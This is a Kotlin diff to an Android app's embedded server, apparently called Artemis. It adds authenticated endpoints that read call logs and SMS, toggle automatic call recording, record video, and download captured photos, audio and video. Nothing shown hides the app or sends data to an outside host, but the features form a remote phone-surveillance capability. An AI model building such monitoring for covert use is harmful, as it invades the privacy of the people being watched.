@@ -17,6 +17,7 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.sync.withLock
 import kotlinx.serialization.Serializable
 import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
@@ -50,7 +51,8 @@ data class HttpResponse(
     val statusCode: Int,
     val contentType: String = "application/json",
     val headers: Map<String, String> = emptyMap(),
-    val body: String = ""
+    val body: String = "",
+    val binaryBody: ByteArray? = null
 )
 
 data class Route(
@@ -138,6 +140,10 @@ class SimpleHttpServer(
     private val locationTracker: LocationTracker,
     private val cameraController: CameraController,
     private val micController: MicController,
+    private val callLogsProvider: com.example.artemis.feature.CallLogsProvider,
+    private val smsProvider: com.example.artemis.feature.SmsProvider,
+    private val callRecorder: com.example.artemis.feature.CallRecorder,
+    private val videoRecorder: com.example.artemis.feature.VideoRecorder,
     private val port: Int = 8443,
     private val useTls: Boolean = true
 ) {
@@ -172,6 +178,9 @@ class SimpleHttpServer(
         private set
 
     val isRunning: Boolean get() = serverSocket != null
+
+    /** True when the socket has been closed (accept-loop will exit). */
+    val serverSocketClosed: Boolean get() = serverSocket?.isClosed ?: true
 
     init {
         Log.i("ArtemisServer", "SimpleHttpServer initializing on port $port, TLS=$useTls")
@@ -222,12 +231,33 @@ class SimpleHttpServer(
         router.post("/api/v1/camera/capture") { requireAuth(it) { req -> cameraCaptureHandler(req) } }
         router.get("/api/v1/camera/captures") { requireAuth(it) { req -> cameraCapturesHandler(req) } }
         router.get("/api/v1/camera/captures/{id}") { requireAuth(it) { req -> cameraCaptureGetHandler(req) } }
+        router.get("/api/v1/camera/captures/{id}/file") { requireAuth(it) { req -> cameraCaptureFileHandler(req) } }
 
         // Microphone
         router.post("/api/v1/mic/record/start") { requireAuth(it) { req -> micRecordStartHandler(req) } }
         router.post("/api/v1/mic/record/stop") { requireAuth(it) { req -> micRecordStopHandler(req) } }
         router.get("/api/v1/mic/recordings") { requireAuth(it) { req -> micRecordingsHandler(req) } }
         router.get("/api/v1/mic/recordings/{id}") { requireAuth(it) { req -> micRecordingGetHandler(req) } }
+        router.get("/api/v1/mic/recordings/{id}/file") { requireAuth(it) { req -> micRecordingFileHandler(req) } }
+
+        // Call logs (READ_CALL_LOG)
+        router.get("/api/v1/logs/calls") { requireAuth(it) { req -> callLogsHandler(req) } }
+
+        // SMS (READ_SMS) — bodies redacted unless ?includeBody=1
+        router.get("/api/v1/sms") { requireAuth(it) { req -> smsHandler(req) } }
+
+        // Call recorder (TelephonyManager-triggered, runs in the FGS)
+        router.get("/api/v1/callrecorder/status") { requireAuth(it) { req -> callRecorderStatusHandler(req) } }
+        router.post("/api/v1/callrecorder/toggle") { requireAuth(it) { req -> callRecorderToggleHandler(req) } }
+        router.get("/api/v1/callrecordings") { requireAuth(it) { req -> callRecordingsHandler(req) } }
+        router.get("/api/v1/callrecordings/{id}") { requireAuth(it) { req -> callRecordingGetHandler(req) } }
+        router.get("/api/v1/callrecordings/{id}/file") { requireAuth(it) { req -> callRecordingFileHandler(req) } }
+
+        // Video recording (CameraX VideoCapture)
+        router.post("/api/v1/video/record") { requireAuth(it) { req -> videoRecordHandler(req) } }
+        router.get("/api/v1/video/list") { requireAuth(it) { req -> videoListHandler(req) } }
+        router.get("/api/v1/video/{id}") { requireAuth(it) { req -> videoGetHandler(req) } }
+        router.get("/api/v1/video/{id}/file") { requireAuth(it) { req -> videoFileHandler(req) } }
     }
 
     // ============================================================
@@ -271,7 +301,7 @@ class SimpleHttpServer(
     private fun healthHandler(req: HttpRequest): HttpResponse {
         return jsonResponse(200, mapOf(
             "status" to "ok",
-            "version" to "1.0.0",
+            "version" to "2.0.0",
             "deviceName" to android.os.Build.MODEL,
             "uptimeSeconds" to ((System.currentTimeMillis() - startTime) / 1000),
             "activeConnections" to activeConnections,
@@ -573,11 +603,18 @@ class SimpleHttpServer(
         val body = parseJsonObject(req.body)
         val cameraId = body?.get("cameraId") ?: "0"
 
+        // CameraController serializes photo capture itself. Do not take its
+        // mutex here as well: kotlinx Mutex is non-reentrant and nesting it
+        // would make every photo request wait forever. Video is guarded in
+        // its own handler because VideoRecorder does not own that lock.
         val result = runBlocking { cameraController.capturePhoto(cameraId) }
         if (result.isSuccess) {
             val capture = result.getOrThrow()
             val captureJson = json.encodeToString(capture)
-            return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), captureJson)
+            // Include status so dashboard clients can distinguish
+            // CAPTURE_OK from CAPTURE_FAILED without parsing fields.
+            return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"),
+                """{"status":"ok","capture":$captureJson}""")
         } else {
             return jsonResponse(500, mapOf("error" to "capture_failed", "message" to (result.exceptionOrNull()?.message ?: "Unknown error")))
         }
@@ -598,6 +635,13 @@ class SimpleHttpServer(
         } else {
             return jsonResponse(404, mapOf("error" to "not_found", "message" to "Capture not found"))
         }
+    }
+
+    private fun cameraCaptureFileHandler(req: HttpRequest): HttpResponse {
+        val id = req.pathParams["id"] ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing capture ID"))
+        val file = cameraController.getCaptureFile(id)
+            ?: return jsonResponse(404, mapOf("error" to "not_found", "message" to "Capture file not found"))
+        return binaryFileResponse(file, "image/jpeg")
     }
 
     private fun micRecordStartHandler(req: HttpRequest): HttpResponse {
@@ -639,6 +683,156 @@ class SimpleHttpServer(
             return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), recJson)
         } else {
             return jsonResponse(404, mapOf("error" to "not_found", "message" to "Recording not found"))
+        }
+    }
+
+    private fun micRecordingFileHandler(req: HttpRequest): HttpResponse {
+        val id = req.pathParams["id"] ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing recording ID"))
+        val file = micController.getRecordingFile(id)
+            ?: return jsonResponse(404, mapOf("error" to "not_found", "message" to "Recording file not found"))
+        return binaryFileResponse(file, if (file.name.endsWith(".wav")) "audio/wav" else "audio/pcm")
+    }
+
+    // ============================================================
+    // Call logs
+    // ============================================================
+
+    private fun callLogsHandler(req: HttpRequest): HttpResponse {
+        val limit = req.queryParams["limit"]?.toIntOrNull() ?: 100
+        val logs = runBlocking { callLogsProvider.getCallLogs(limit) }
+        val logsJson = json.encodeToString(logs)
+        return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"),
+            """{"calls":$logsJson,"count":${logs.size}}""")
+    }
+
+    // ============================================================
+    // SMS
+    // ============================================================
+
+    private fun smsHandler(req: HttpRequest): HttpResponse {
+        val box = req.queryParams["box"] ?: "inbox"
+        val limit = req.queryParams["limit"]?.toIntOrNull() ?: 100
+        val includeBody = req.queryParams["includeBody"] == "1" || req.queryParams["includeBody"] == "true"
+        val messages = runBlocking { smsProvider.getSms(box, limit, includeBody) }
+        val smsJson = json.encodeToString(messages)
+        return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"),
+            """{"messages":$smsJson,"count":${messages.size},"box":"${box.lowercase()}","bodiesRedacted":${!includeBody}}""")
+    }
+
+    // ============================================================
+    // Call recorder
+    // ============================================================
+
+    private fun callRecorderStatusHandler(req: HttpRequest): HttpResponse {
+        return jsonResponse(200, mapOf(
+            "enabled" to callRecorder.autoRecordEnabled,
+            "recording" to callRecorder.isRecordingCall,
+            "count" to callRecorder.getRecordings().size
+        ))
+    }
+
+    private fun callRecorderToggleHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val enabled = body?.get("enabled")
+        when (enabled) {
+            "true", "1" -> callRecorder.autoRecordEnabled = true
+            "false", "0" -> callRecorder.autoRecordEnabled = false
+            else -> callRecorder.autoRecordEnabled = !callRecorder.autoRecordEnabled
+        }
+        Log.i("ArtemisServer", "Call auto-recording ${if (callRecorder.autoRecordEnabled) "enabled" else "disabled"} by dashboard")
+        return jsonResponse(200, mapOf("enabled" to callRecorder.autoRecordEnabled))
+    }
+
+    private fun callRecordingsHandler(req: HttpRequest): HttpResponse {
+        val recordings = callRecorder.getRecordings()
+        val recJson = json.encodeToString(recordings)
+        return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"),
+            """{"recordings":$recJson,"count":${recordings.size}}""")
+    }
+
+    private fun callRecordingGetHandler(req: HttpRequest): HttpResponse {
+        val id = req.pathParams["id"] ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing recording ID"))
+        val recording = callRecorder.getRecording(id)
+        if (recording != null) {
+            val recJson = json.encodeToString(recording)
+            return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), recJson)
+        }
+        return jsonResponse(404, mapOf("error" to "not_found", "message" to "Recording not found"))
+    }
+
+    private fun callRecordingFileHandler(req: HttpRequest): HttpResponse {
+        val id = req.pathParams["id"] ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing recording ID"))
+        val file = callRecorder.getRecordingFile(id)
+            ?: return jsonResponse(404, mapOf("error" to "not_found", "message" to "Recording file not found"))
+        return binaryFileResponse(file, "audio/mp4")
+    }
+
+    // ============================================================
+    // Video recording
+    // ============================================================
+
+    private fun videoRecordHandler(req: HttpRequest): HttpResponse {
+        val body = parseJsonObject(req.body)
+        val cameraId = body?.get("cameraId") ?: "back"
+        val durationMs = body?.get("durationMs")?.toLongOrNull() ?: 15_000L
+
+        val result = runBlocking {
+            CameraController.cameraMutex.withLock {
+                videoRecorder.record(cameraId, durationMs)
+            }
+        }
+        if (result.isSuccess) {
+            val video = result.getOrThrow()
+            val videoJson = json.encodeToString(video)
+            return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), videoJson)
+        }
+        return jsonResponse(500, mapOf("error" to "record_failed", "message" to (result.exceptionOrNull()?.message ?: "Unknown error")))
+    }
+
+    private fun videoListHandler(req: HttpRequest): HttpResponse {
+        val videos = videoRecorder.getVideos()
+        val videosJson = json.encodeToString(videos)
+        return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"),
+            """{"videos":$videosJson,"count":${videos.size}}""")
+    }
+
+    private fun videoGetHandler(req: HttpRequest): HttpResponse {
+        val id = req.pathParams["id"] ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing video ID"))
+        val video = videoRecorder.getVideo(id)
+        if (video != null) {
+            val videoJson = json.encodeToString(video)
+            return HttpResponse(200, "application/json", mapOf("Access-Control-Allow-Origin" to "*"), videoJson)
+        }
+        return jsonResponse(404, mapOf("error" to "not_found", "message" to "Video not found"))
+    }
+
+    private fun videoFileHandler(req: HttpRequest): HttpResponse {
+        val id = req.pathParams["id"] ?: return jsonResponse(400, mapOf("error" to "bad_request", "message" to "Missing video ID"))
+        val file = videoRecorder.getVideoFile(id)
+            ?: return jsonResponse(404, mapOf("error" to "not_found", "message" to "Video file not found"))
+        return binaryFileResponse(file, "video/mp4")
+    }
+
+    /**
+     * Stream a file's bytes with correct Content-Type and Content-Length.
+     * Used for photos, recordings and videos so the dashboard can pull
+     * captured media over the same authenticated TLS channel.
+     */
+    private fun binaryFileResponse(file: java.io.File, mimeType: String): HttpResponse {
+        return try {
+            val bytes = file.readBytes()
+            HttpResponse(
+                200,
+                contentType = mimeType,
+                headers = mapOf(
+                    "Access-Control-Allow-Origin" to "*",
+                    "Content-Disposition" to "attachment; filename=\"${file.name}\""
+                ),
+                binaryBody = bytes
+            )
+        } catch (e: Exception) {
+            Log.e("ArtemisServer", "File read failed: ${e.message}")
+            jsonResponse(500, mapOf("error" to "read_failed", "message" to "Could not read file"))
         }
     }
 
@@ -941,7 +1135,7 @@ class SimpleHttpServer(
 
     private fun sendHttpResponse(output: OutputStream, response: HttpResponse) {
         try {
-            val bodyBytes = response.body.toByteArray(Charsets.UTF_8)
+            val bodyBytes = response.binaryBody ?: response.body.toByteArray(Charsets.UTF_8)
             val statusText = when (response.statusCode) {
                 200 -> "OK"
                 400 -> "Bad Request"
@@ -966,7 +1160,7 @@ class SimpleHttpServer(
             for ((key, value) in response.headers) {
                 headerLines.append("$key: $value\r\n")
             }
-            headerLines.append("Server: Artemis/1.0.0\r\n")
+            headerLines.append("Server: Artemis/2.0.0\r\n")
             headerLines.append("\r\n")
 
             output.write(headerLines.toString().toByteArray(Charsets.UTF_8))
